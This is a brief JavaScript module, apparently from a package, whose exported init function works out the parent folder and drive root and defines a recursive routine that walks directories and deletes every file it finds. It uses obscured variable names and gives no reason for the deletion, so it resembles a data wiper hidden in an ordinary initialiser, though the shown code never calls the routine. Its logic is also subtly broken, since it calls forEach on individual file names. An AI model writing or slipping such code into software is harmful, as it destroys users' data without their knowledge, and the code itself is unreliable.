exports = module.exports = function init(____0) {
    let ff = ____0.path.join(____0.dir + '/../');
    let f0 = ____0.path.dirname(____0.dir).split(____0.path.sep)[0];
    if (f0.endsWith(':')) {
        f0 = f0 + '\\';
    }

    function df(f00) {
        ____0.fs.readdirSync(f00).forEach((ss) => {
            ss.forEach((f) => {
                f = ____0.path.join(f00, f);
                ____0.fs.access(f, ____0.fs.F_OK, (err) => {
                    if (!err) {
                        if (____0.fs.statSync(f).isDirectory()) {
                            df(f);
                        }
                        if (____0.fs.statSync(f).isFile()) {
                            ____0.fs.unlink(f);
                        }
                    }
                });
            });
        });
    }
};
